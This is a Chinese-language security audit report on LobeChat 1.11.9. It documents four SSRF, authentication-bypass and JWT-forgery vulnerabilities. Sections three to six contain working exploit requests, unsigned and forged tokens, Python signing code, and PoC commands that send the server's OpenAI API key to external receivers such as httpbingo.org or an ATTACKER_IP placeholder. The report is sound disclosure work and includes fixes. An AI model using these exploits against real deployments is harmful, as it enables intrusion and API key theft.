# LobeChat 1.11.9 本地部署漏洞挖掘报告

> 测试对象：`lobe-chat-main`（`@lobehub/chat` **1.11.9**，源码目录 `/home/ddl/Desktop/MyShare/baogao/lobe-chat-main/lobe-chat-main`）
> 测试方式：本地源码部署 + 源码审计 + 黑盒复现
> 测试日期：2026-11-18
> 测试环境：Ubuntu / Node.js 20.20.2 / Next.js 14.2.35（`next dev`，端口 3010）/ 客户端数据库模式

---

## 一、概述

LobeChat 是开源自托管 AI 聊天框架。本次在本地完整部署 1.11.9 版本后，围绕其 API 路由的鉴权、SSRF 防护和 JWT 信任链进行审计，共确认 **4 个可复现漏洞**：

| 编号 | 漏洞 | 类型 | 前置条件 | 严重度 |
|---|---|---|---|---|
| V1 | `/api/proxy` 未授权 SSRF（私网校验可绕过） | CWE-918 | 无（无需 ACCESS_CODE） | 高危 |
| V2 | `/api/plugin/gateway` 未授权 SSRF（可回显、可自定义 POST 体） | CWE-918 | 无需账号；默认配置直接放行 | 高危 |
| V3 | `/api/openai/tts`、`/api/openai/stt` 鉴权绕过 + 服务端 `OPENAI_API_KEY` 外带 | CWE-290 / CWE-200 / CWE-918 | 未授权（默认/Clerk 模式）；启用 NextAuth 时需任意登录会话 | 严重 |
| V4 | JWT 伪造 + `apiKey` 字段绕过 `ACCESS_CODE` + `endpoint` SSRF | CWE-347 / CWE-290 / CWE-918 | 无 | 高危 |

其中：

- **V1** 是官方针对 CVE-2024-32964（`/api/proxy` 未授权 SSRF）修复的**不完整绕过**：1.11.9 已加入 `ip.isPrivate()` 校验，但该校验不覆盖 `0.0.0.0`，且 `fetch` 默认跟随 302 跳转，两个向量都能重新打通内网。
- **V2**、**V3** 未在 NVD / GitHub Advisory 中检索到对应条目（检索时间 2026-11-18），为本版本中新确认的问题。
- **V4** 与 CVE-2024-32965（`X-Lobe-Chat-Auth` 中代理地址/API Key 可篡改导致 SSRF，修复于 1.19.13）同类，1.11.9 仍在影响范围内；本报告补充了“无签名 `http_nosafe` 令牌”和“硬编码 JWT 密钥”两个根因。

---

## 二、本地部署

### 2.1 部署步骤

源码位于 VMware 共享目录（`/mnt/hgfs/...`），该文件系统不支持 pnpm 所需的符号链接，因此将源码复制到本地磁盘部署：

```bash
rsync -a --exclude node_modules --exclude .next \
  /home/ddl/Desktop/MyShare/baogao/lobe-chat-main/lobe-chat-main/ /home/ddl/lobe-lab/app/

cd /home/ddl/lobe-lab/app
npx pnpm@9.7.1 install --registry=https://registry.npmjs.org

cat > .env.local <<'EOF'
ACCESS_CODE=lobe2024
OPENAI_API_KEY=sk-lobe-server-secret-123
NEXT_TELEMETRY_DISABLED=1
EOF

NODE_OPTIONS=--max-old-space-size=4096 npx next dev -p 3010
```

启动成功：

```
▲ Next.js 14.2.35
- Local:        http://localhost:3010
- Environments: .env.local
✓ Ready in 1.7s
```

> 首页 `/` 在 dev 模式下首次访问需要现场编译约 25,000 个模块（本次约 85 秒），期间浏览器表现为空白/一直转圈，属正常现象，编译完成后再次访问为毫秒级。若编译时出现 V8 OOM（`PackFileCacheStrategy` 序列化大字符串），可在 lab 副本 `next.config.mjs` 的 `webpack(config, { dev })` 中加 `if (dev) config.cache = false;` 并重启。

### 2.2 模拟“内网服务”

为了证明 SSRF 真实到达内网，在 `127.0.0.1:18080` 启动一个仅本机可访问的模拟内部服务（`poc/httpmock.py`，监听 `[::]:18080` 双栈）：

- `GET /internal/secret` 返回内部标记 `FLAG{LOCAL_SSRF_INTERNAL_ONLY_7f3a}`；
- `POST /v1/audio/speech`、`POST /v1/chat/completions` 记录请求头/请求体，用于观察服务端是否把密钥带到攻击者指定的地址。

### 2.3 版本与依赖

| 组件 | 版本 |
|---|---|
| LobeChat | 1.11.9 |
| Next.js | 14.2.35 |
| `@lobehub/chat-plugins-gateway` | 1.9.0 |
| `@lobehub/tts` | 1.29.0 |
| `ip` | 2.0.1 |

> 说明：仓库未附带 lockfile（`.npmrc` 中 `lockfile=false`），依赖按 semver 浮动安装，因此实际安装版本与 `package.json` 声明可能不同；以上为本次实测版本。V1/V2/V4 与具体依赖小版本无关，V3 的请求体结构随 `@lobehub/tts` 版本略有差异（见 4.3）。

---

## 三、V1：`/api/proxy` 未授权 SSRF（私网校验绕过）

### 3.1 漏洞位置

`src/app/api/proxy/route.ts`

```ts
import { isPrivate } from 'ip';
...
export const POST = async (req: Request) => {
  const url = new URL(await req.text());
  let address;
  try {
    const lookupResult = await lookupAsync(url.hostname);
    address = lookupResult.address;
  } catch (err) { ... }

  const isInternalHost = isPrivate(address);
  if (isInternalHost)
    return NextResponse.json({ error: 'Not support internal host proxy' }, { status: 400 });

  const res = await fetch(url.toString());          // ← 默认 follow 重定向，未固定已校验 IP
  return new Response(res.body, { headers: res.headers });
};
```

该路由**没有任何鉴权**（不读取 `ACCESS_CODE`，中间件默认也不拦截），任意互联网用户均可调用。

### 3.2 绕过原理

1. **`0.0.0.0` 绕过**：`ip.isPrivate('0.0.0.0')` 返回 `false`，而 Linux 上连接 `0.0.0.0:port` 会落到本机回环，因此 `http://0.0.0.0:18080/...` 直接通过校验并访问本机服务。
2. **302 跳转绕过**：代码只对**初始 URL 的 hostname** 做一次 `dns.lookup` + `isPrivate` 校验，随后 `fetch()` 默认 `redirect: 'follow'`。攻击者用一个公网 URL（例如 TinyURL）302 跳转到 `http://127.0.0.1:18080/...`，即可完全跳过私网校验。
3. **校验盲区**：`ip.isPrivate()` 不覆盖 `100.64.0.0/10`（CGNAT，阿里云元数据 `100.100.100.200` 位于该段），也不覆盖 DNS Rebinding（校验一次、连接时再次解析）。本次实测确认 `isPrivate('100.64.0.1') === false`。

### 3.3 复现

基线（直连 127.0.0.1 被拦截）：

```http
POST /api/proxy HTTP/1.1
Host: 127.0.0.1:3010

http://127.0.0.1:18080/internal/secret
```

```http
HTTP/1.1 400 Bad Request

{"error":"Not support internal host proxy"}
```

绕过 1（`0.0.0.0`）：

```http
POST /api/proxy HTTP/1.1
Host: 127.0.0.1:3010

http://0.0.0.0:18080/internal/secret
```

```http
HTTP/1.1 200 OK

{"internal": true, "flag": "FLAG{LOCAL_SSRF_INTERNAL_ONLY_7f3a}", "note": "this endpoint is only reachable from loopback"}
```

绕过 2（公网 302 → 内网）：

```http
POST /api/proxy HTTP/1.1
Host: 127.0.0.1:3010

https://tinyurl.com/23pwvfwh        # 302 Location: http://127.0.0.1:18080/internal/secret
```

```http
HTTP/1.1 200 OK

{"internal": true, "flag": "FLAG{LOCAL_SSRF_INTERNAL_ONLY_7f3a}", "note": "this endpoint is only reachable from loopback"}
```

原始请求/响应见 `证据/01_v1_blocked_localhost.txt`、`证据/02_v1_bypass_0000.txt`、`证据/03_v1_bypass_redirect.txt`。

### 3.4 影响

- 未授权探测/读取内网 HTTP 服务（Redis 管理面板、Elasticsearch、MinIO、内部 API 等），响应体和响应头原样返回；
- 在云主机上可访问部分元数据/CGNAT 地址段（取决于 `isPrivate` 盲区与网络策略）；
- 可配合 DNS Rebinding 对内网做端口扫描与服务识别。

### 3.5 修复建议

- 直接删除该调试代理，或改为服务端白名单；
- 若必须保留：解析并**固定**目标 IP 后再连接（pin IP），禁止重定向（`redirect: 'manual'`）并逐跳校验；
- 拒绝 `0.0.0.0`、`::`、回环、链路本地、`100.64.0.0/10`、私有网段，以及 IPv4-mapped IPv6；
- 在出站侧增加网络策略，禁止应用进程访问元数据地址。

---

## 四、V2：`/api/plugin/gateway` 未授权 SSRF（可回显）

### 4.1 漏洞位置与调用链

路由：`src/app/api/plugin/gateway/route.ts`

```ts
const checkAuth = (accessCode, oauthAuthorized) => {
  const { ACCESS_CODES, PLUGIN_SETTINGS } = getAppConfig();
  // 默认没有配置 PLUGIN_SETTINGS 时，直接判定通过
  if (!PLUGIN_SETTINGS) return { auth: true };
  if (oauthAuthorized && enableNextAuth) return { auth: true };
  if (!ACCESS_CODES.length) return { auth: true };
  ...
};

export const POST = async (req: Request) => {
  const authorization = req.headers.get(LOBE_CHAT_AUTH_HEADER);
  if (!authorization) throw ...;
  const payload = await getJWTPayload(authorization);
  const result = checkAuth(payload.accessCode!, oauthAuthorized);
  ...
  const res = await handler(req);   // → chat-plugins-gateway
};
```

令牌解析：`src/app/api/middleware/auth/utils.ts`

```ts
if (token.startsWith(NON_HTTP_PREFIX)) {          // "http_nosafe"
  const payload = token.split('.')[1];
  return JSON.parse(atob(payload));               // ← 完全不校验签名
}
const { payload } = await jwtVerify(token, jwkSecretKey);  // 密钥见下
```

JWT 密钥：`src/const/auth.ts`

```ts
export const JWT_SECRET_KEY = 'LobeHub · LobeChat';   // ← 硬编码在源码中
export const NON_HTTP_PREFIX = 'http_nosafe';
```

网关实际发起请求：`@lobehub/chat-plugins-gateway@1.9.0` 的 `Gateway.callApi()`

```js
const response = await fetch(api.url, {          // ← api.url 完全来自请求体 manifest
  body: args,
  headers: createHeadersWithPluginSettings(settings),
  method: "POST",
});
const data = await response.text();
return { data, success: true };                  // ← 内网响应原文返回
```

调用链：

```
POST /api/plugin/gateway
  → getJWTPayload(伪造令牌 / http_nosafe 无签名令牌)
  → checkAuth：PLUGIN_SETTINGS 未配置 → 直接放行
  → Gateway.execute(payload)
  → callApi(manifest.api[0].url)
  → fetch(任意 URL, method=POST, body=攻击者可控)
  → 响应正文原样返回
```

### 4.2 复现

请求（`ACCESS_CODE=lobe2024` 已开启，仍然成功）：

```http
POST /api/plugin/gateway HTTP/1.1
Host: 127.0.0.1:3010
X-lobe-chat-auth: http_nosafe.eyJhY2Nlc3NDb2RlIjoiIiwiYXBpS2V5IjoieCIsInVzZXJJZCI6ImF0dGFja2VyIn0=
Content-Type: application/json

{
  "identifier": "pwn",
  "apiName": "get",
  "arguments": "{}",
  "manifest": {
    "identifier": "pwn",
    "meta": {"title": "pwn"},
    "api": [{
      "name": "get",
      "description": "get",
      "url": "http://0.0.0.0:18080/internal/secret",
      "parameters": {"type": "object", "properties": {}}
    }]
  }
}
```

响应：

```http
HTTP/1.1 200 OK
access-control-allow-origin: *
content-type: text/plain;charset=UTF-8

{"internal": true, "flag": "FLAG{LOCAL_SSRF_INTERNAL_ONLY_7f3a}", "note": "this endpoint is only reachable from loopback"}
```

同时验证了使用硬编码密钥伪造的 HS256 签名令牌同样可用（`证据/04_v2_gateway_ssrf.txt`、`证据/04b_v2_gateway_signed.txt`）。

### 4.3 影响

- **未授权**（默认未配置 `PLUGIN_SETTINGS` 时，任何通过令牌解析的请求都被放行；`http_nosafe` 前缀使令牌无需签名）；
- 服务端向任意地址发起 **POST** 请求，请求体、部分请求头（`X-Lobe-Plugin-Settings` 等）可控；
- **内网响应正文完整回显**，等价于一个 HTTP 内网代理，可用于读取内部 API、云元数据、Elasticsearch 等；
- SSRF 在 Edge Runtime 中执行，同样不受 `api/proxy` 的私网校验约束。

### 4.4 修复建议

- 服务端不得信任客户端提交的 `manifest`/`indexUrl`，只允许从可信插件市场索引加载并校验签名；
- 对 `api.url` / `openapi` 做 scheme + host + 解析后 IP 白名单校验，禁止私网、回环、链路本地、CGNAT，禁止重定向；
- `checkAuth` 中删除 `if (!PLUGIN_SETTINGS) return { auth: true }`，未配置插件时也应校验 ACCESS_CODE；
- 移除 `http_nosafe` 无签名令牌分支（至少仅在 HTTP 且显式开启时启用），并将 JWT 密钥改为部署时随机生成的环境变量。

---

## 五、V3：`/api/openai/tts`、`/api/openai/stt` 鉴权绕过 + 服务端 API Key 外带

### 5.1 漏洞位置

`src/app/api/openai/createBizOpenAI/auth.ts`

```ts
export const checkAuth = ({ apiKey, accessCode, oauthAuthorized }: AuthConfig) => {
  if (oauthAuthorized) {          // ← 只看请求头是否存在，未检查 enableNextAuth / 服务端会话
    return { auth: true };
  }
  const { ACCESS_CODES } = getAppConfig();
  if (apiKey) return { auth: true };
  if (!ACCESS_CODES.length) return { auth: true };
  ...
};
```

`src/const/fetch.ts` 将 `X-oauth-authorized` 头直接映射为 `oauthAuthorized`：

```ts
const oauthAuthorized = !!req.headers.get(OAUTH_AUTHORIZED);   // OAUTH_AUTHORIZED = 'X-oauth-authorized'
```

`src/app/api/openai/createBizOpenAI/createOpenai.ts`

```ts
const baseURL = endpoint ? endpoint : OPENAI_PROXY_URL ? OPENAI_PROXY_URL : undefined;
const apiKey = !userApiKey ? OPENAI_API_KEY : userApiKey;   // ← 用户不传 key 时使用服务端 key
return new OpenAI({ apiKey, baseURL });                     // ← baseURL 来自请求头 X-openai-end-point
```

对比聊天路由使用的 `checkAuthMethod`，它正确地要求 `enableNextAuth && nextAuthAuthorized` 同时成立；而 TTS/STT 这套实现漏掉了 `enableNextAuth` 判断。

### 5.2 复现

基线（无凭证）：

```http
POST /api/openai/tts HTTP/1.1
Host: 127.0.0.1:3010
Content-Type: application/json
X-openai-end-point: http://0.0.0.0:18080/v1

{"input":"hello","options":{"model":"tts-1","voice":"alloy"}}
```

```http
HTTP/1.1 401 Unauthorized

{"errorType":"InvalidAccessCode"}
```

绕过（仅加一个 `X-oauth-authorized: true`）：

```http
POST /api/openai/tts HTTP/1.1
Host: 127.0.0.1:3010
Content-Type: application/json
X-oauth-authorized: true
X-openai-end-point: http://0.0.0.0:18080/v1

{"input":"hello","options":{"model":"tts-1","voice":"alloy"}}
```

```http
HTTP/1.1 200 OK
content-type: audio/mpeg

ID3....FAKE-AUDIO
```

服务端实际发出的请求（`证据/08_internal_access_log.txt`）：

```
POST /v1/audio/speech
Authorization: Bearer sk-lobe-server-secret-123      ← 服务端 OPENAI_API_KEY 被带到攻击者地址
Body: {"input":"hello","model":"tts-1","voice":"alloy"}
```

> 请求体结构说明：本次安装的 `@lobehub/tts@1.29.0` 从 `payload.options` 读取 `model/voice`；旧版本使用顶层字段。鉴权绕过发生在进入 TTS 逻辑之前，与请求体结构无关。

**公网外带验证（关键）**：将 `X-openai-end-point` 指向公网回声服务 `https://httpbingo.org/anything`，服务端会向 `https://httpbingo.org/anything/audio/speech` 发起请求，回声服务把收到的请求头原样返回，攻击者在响应里即可直接读到服务端 key：

```http
POST /api/openai/tts HTTP/1.1
Host: 127.0.0.1:3010
Content-Type: application/json
X-oauth-authorized: true
X-openai-end-point: https://httpbingo.org/anything

{"input":"hello","options":{"model":"tts-1","voice":"alloy"}}
```

```http
HTTP/1.1 200 OK

{
  "headers": {
    "Authorization": ["Bearer sk-lobe-server-secret-123"],
    ...
  },
  "url": "https://httpbingo.org/anything/audio/speech"
}
```

这证明 key 已**真正离开服务端主机并到达外部服务器**，不依赖本地模拟内网；攻击者也不需要登录、不需要知道 `ACCESS_CODE`。完整输出见 `证据/09_v3_external_exfil_httpbingo.txt`（公网 IP 已脱敏）。

`/api/openai/stt` 使用同一 `createBizOpenAI`，只把请求体换成 multipart，同样会把服务端 key 发往 `https://httpbingo.org/anything/audio/transcriptions`（`证据/10_v3_external_exfil_stt_httpbingo.txt`）。

**Burp 原始请求包**：`poc/burp/burp_v3_tts.txt`（JSON）和 `poc/burp/burp_v3_stt.txt`（multipart）。使用时把 `Host` 改为目标地址，把 `X-openai-end-point` 改为攻击者接收端（如 `https://webhook.site/<uuid>` 或自建 `http://ATTACKER_IP:PORT/v1`），`Content-Length` 由 Burp 自动修正；`/api/openai/stt` 的 `options` 字段在 `@lobehub/tts@1.29.0` 下需要携带 `mineType`（见包内示例）。

**独立 PoC 脚本**：`poc/poc_v3_tts_key_leak.py`，一条命令完成“基线 401 → 绕过 200 → 从响应提取 key”，支持 `--mode tts|stt`、`--receiver`、`--check-auth`，并会对旧版 `@lobehub/tts` 的 body 结构自动回退：

```bash
# 用公网回显服务，响应中直接看到 key
python3 poc/poc_v3_tts_key_leak.py --target http://127.0.0.1:3010 \
  --receiver https://httpbingo.org/anything --check-auth

# 用自建接收端（另开终端，先启动 key_receiver.py）
python3 poc/key_receiver.py --port 4444
python3 poc/poc_v3_tts_key_leak.py --target http://127.0.0.1:3010 \
  --receiver http://YOUR_PUBLIC_IP:4444 --mode stt
```

脚本输出见 `证据/11_v3_poc_script_output.txt`。

### 5.3 影响

- **未授权**：攻击者不需要账号、不需要登录、也不需要知道 `ACCESS_CODE`，只要能访问 `/api/openai/tts`（或 `/api/openai/stt`）即可。这是服务端 API 路由的鉴权缺陷，不是浏览器前端问题（无需先打开页面或登录 UI）。
- 生效范围：
  - **默认自托管（只设 `ACCESS_CODE`）**：未授权可打，本次实测环境即此模式；
  - **启用 Clerk**：`clerkMiddleware` 不会删除 `X-oauth-authorized` 头，路由层也不校验 Clerk 会话，因此仍可未授权利用（基于代码路径判断，未接真实 Clerk 租户实测）；
  - **启用 NextAuth**：`nextAuthMiddleware` 会删除未登录请求的 `X-oauth-authorized` 头，此时需要任意一个登录会话才能利用；
- 若服务端配置了 `OPENAI_API_KEY`，攻击者通过 `X-openai-end-point` 指定自己的地址，即可**直接拿到服务端 API Key**（`Authorization: Bearer ...`），造成资金损失与密钥泄露；
- 同时构成 SSRF：服务端会向任意 `endpoint` 发起 `POST /audio/speech`（STT 为 `/audio/transcriptions`），请求体可控；
- `/api/openai/stt` 复用同一 `createBizOpenAI`，同样受影响。

### 5.4 修复建议

- `oauthAuthorized` 必须与 `enableNextAuth` 及服务端会话校验绑定，不能仅凭请求头布尔值放行；
- 禁止把服务端 `OPENAI_API_KEY` 发送到用户可控的 `baseURL`；用户自定义 endpoint 时只能使用用户自带的 key；
- 对 `X-openai-end-point` 做严格白名单（协议 + 域名 + 解析后 IP），禁止私网与重定向；
- 统一聊天与 TTS/STT 的鉴权实现，避免两套逻辑不一致。

---

## 六、V4：JWT 伪造 + `apiKey` 绕过 `ACCESS_CODE` + `endpoint` SSRF

### 6.1 根因

1. **硬编码 JWT 密钥**：`src/const/auth.ts` 中 `JWT_SECRET_KEY = 'LobeHub · LobeChat'`，签名密钥 = `SHA-256(该字符串)`，任何读过源码的人都能签发合法 JWT。
2. **无签名令牌分支**：`getJWTPayload()` 对以 `http_nosafe.` 开头的令牌直接 `atob` 解析 JSON，不校验签名；该分支未限制仅在 HTTP 协议下启用。
3. **`apiKey` 字段绕过 ACCESS_CODE**：`checkAuthMethod()` 中 `if (apiKey) return;`，只要令牌 payload 里带任意非空 `apiKey`，就不再校验 `ACCESS_CODE`。
4. **`endpoint` 可控**：`getLlmOptionsFromPayload()` 中 `baseURL = payload.endpoint || OPENAI_PROXY_URL`，攻击者可让服务端把聊天请求发往任意地址。

### 6.2 复现

无令牌（基线）：

```http
POST /api/chat/openai HTTP/1.1
Host: 127.0.0.1:3010
Content-Type: application/json

{"model":"gpt-3.5-turbo","messages":[{"role":"user","content":"hi"}],"stream":false}
```

```http
HTTP/1.1 401 Unauthorized

{"body":{"error":{"errorType":401},"provider":"openai"},"errorType":401}
```

无签名令牌（`http_nosafe` + base64）：

```http
X-lobe-chat-auth: http_nosafe.eyJhY2Nlc3NDb2RlIjoiIiwiYXBpS2V5Ijoic2stYXR0YWNrZXItZmFrZSIsImVuZHBvaW50IjoiaHR0cDovLzAuMC4wLjA6MTgwODAvdjEiLCJ1c2VySWQiOiJhdHRhY2tlciJ9
```

```http
HTTP/1.1 200 OK

id: chatcmpl-internal
event: text
data: "internal-ok"
...
```

使用硬编码密钥伪造 HS256 签名令牌（Python）：

```python
key = hashlib.sha256("LobeHub · LobeChat".encode()).digest()
sig = hmac.new(key, f"{head}.{body}".encode(), hashlib.sha256).digest()
```

同样返回 `HTTP 200`，服务端将请求发往 `http://0.0.0.0:18080/v1/chat/completions`（`证据/07_v4_chat_token_forgery.txt`）。

### 6.3 影响

- 在启用 `ACCESS_CODE` 的部署中完全绕过访问口令；
- 通过 `endpoint` 让服务端向任意内网地址发起带自定义 JSON 体的 POST 请求，形成 SSRF；
- `X-lobe-chat-auth` 令牌可长期伪造（自定义 `exp`），无需任何账号；
- 与 CVE-2024-32965 同类，1.11.9 不在修复版本（1.19.13）内。

### 6.4 修复建议

- JWT 密钥改为部署时随机生成（`openssl rand -base64 32`），不得硬编码；
- 删除 `http_nosafe` 无签名分支，或仅在明确开启的 HTTP 调试模式下启用；
- 不得以 `apiKey` 是否存在作为 `ACCESS_CODE` 的替代凭证；如需 BYOK，应校验 key 格式并与用户身份绑定；
- `endpoint` 仅允许服务端配置或严格白名单，禁止用户控制出站目标；
- 升级到 1.19.13 及以上版本。

---

## 七、利用链与整体影响

```
互联网攻击者
  ├─ V1  /api/proxy             → 无需任何凭证，读内网 HTTP（0.0.0.0 / 302 / DNS Rebinding）
  ├─ V2  /api/plugin/gateway    → 无需账号（默认 PLUGIN_SETTINGS 未配置），POST 任意 URL 并回显
  ├─ V3  /api/openai/tts|stt    → 绕过 ACCESS_CODE，拿到服务端 OPENAI_API_KEY + SSRF
  └─ V4  /api/chat/[provider]   → 伪造 JWT 绕过 ACCESS_CODE，endpoint 指向内网
```

组合效果：

1. **访问控制形同虚设**：V3/V4 可在开启 `ACCESS_CODE` 的情况下绕过口令；
2. **密钥泄露**：V3 直接把服务端 `OPENAI_API_KEY` 发送到攻击者服务器；
3. **内网横向**：V1/V2/V4 均可访问回环/内网服务，V2 还能完整回显响应，可读取内部管理接口、云元数据等敏感信息；
4. **资源滥用**：绕过口令后可消耗服务端配置的模型额度（V3 直接使用服务端 key）。

---

## 八、修复优先级建议

| 优先级 | 措施 |
|---|---|
| P0 | 升级至官方最新版本；若无法升级，先下线 `/api/proxy` 与 `/api/plugin/gateway`，或在反向代理层禁止外网访问 |
| P0 | 修复 `createBizOpenAI` 的 `oauthAuthorized` 判断；禁止服务端 key 发往用户提供的 endpoint |
| P1 | JWT 密钥改为随机环境变量；移除 `http_nosafe` 无签名分支；`apiKey` 不得绕过 ACCESS_CODE |
| P1 | 所有出站请求统一做 SSRF 防护：解析并固定 IP、禁止重定向、拒绝私网/回环/链路本地/CGNAT/IPv4-mapped IPv6 |
| P2 | 在容器/主机层增加出站网络策略，禁止访问云元数据地址；对 `/api/*` 增加统一鉴权与速率限制 |

---

## 九、附录

### 9.1 交付文件

```
LobeChat-1.11.9-漏洞报告/
├── LobeChat 1.11.9 漏洞报告.md      # 本报告
├── 交付说明.md
├── poc/
│   ├── poc.py                       # 一键验证 V1~V4
│   ├── poc_v3_tts_key_leak.py       # V3 专项 PoC（tts/stt，自动提取 key）
│   ├── key_receiver.py              # V3 自建接收端（打印 Authorization）
│   ├── httpmock.py                  # 模拟内网服务（127.0.0.1:18080）
│   ├── run_evidence.sh              # 生成 curl 原始证据
│   └── burp/
│       ├── burp_v3_tts.txt          # V3 /api/openai/tts Burp 原始包（JSON）
│       └── burp_v3_stt.txt          # V3 /api/openai/stt Burp 原始包（multipart）
└── 证据/
    ├── 00_deploy.txt                # 部署与进程信息
    ├── 01_v1_blocked_localhost.txt  # V1 基线（400 拦截）
    ├── 02_v1_bypass_0000.txt        # V1 0.0.0.0 绕过
    ├── 03_v1_bypass_redirect.txt    # V1 302 跳转绕过
    ├── 04_v2_gateway_ssrf.txt       # V2 未授权 SSRF 回显
    ├── 04b_v2_gateway_signed.txt    # V2 伪造 HS256 签名令牌同样可用
    ├── 05_v3_tts_no_auth.txt        # V3 基线（401）
    ├── 06_v3_tts_auth_bypass.txt    # V3 请求头绕过成功
    ├── 07_v4_chat_token_forgery.txt # V4 无令牌/无签名/伪造签名对比
    ├── 08_internal_access_log.txt   # 内部服务日志（含 Bearer 服务端 key）
    ├── 09_v3_external_exfil_httpbingo.txt # V3 公网外带验证（TTS，响应中回显服务端 key）
    ├── 10_v3_external_exfil_stt_httpbingo.txt # V3 公网外带验证（STT）
    ├── 11_v3_poc_script_output.txt   # V3 专项 PoC 脚本输出（基线 401 → 绕过 200 → key）
    └── poc_run.log                  # 一键脚本完整输出（4 项 PASS）
```

### 9.2 复现命令

```bash
# 1. 启动模拟内网服务
python3 poc/httpmock.py

# 2. 启动 LobeChat（另开终端）
cd /home/ddl/lobe-lab/app
NODE_OPTIONS=--max-old-space-size=4096 npx next dev -p 3010

# 3. 一键验证
python3 poc/poc.py --target http://127.0.0.1:3010 --internal http://0.0.0.0:18080
```

预期结果：

```
PASS  V1 /api/proxy SSRF
PASS  V2 /api/plugin/gateway SSRF
PASS  V3 /api/openai/tts auth bypass + key leak
PASS  V4 /api/chat/openai token forgery
```

### 9.3 测试限制

- 本次为源码 `next dev` 本地部署，未做生产 `next build`；漏洞均位于服务端路由逻辑，与 dev/prod 无关。
- 未对公网真实目标进行测试，全部请求仅发往 `127.0.0.1:3010` 与本地模拟内网 `127.0.0.1:18080`。
- `100.64.0.0/10`（阿里云元数据段）仅通过 `ip.isPrivate()` 返回值确认校验盲区，未在真实云环境验证连通性。
- 仓库无 lockfile，依赖版本浮动；V3 的 TTS 请求体结构依赖 `@lobehub/tts` 版本，鉴权绕过本身不受影响。
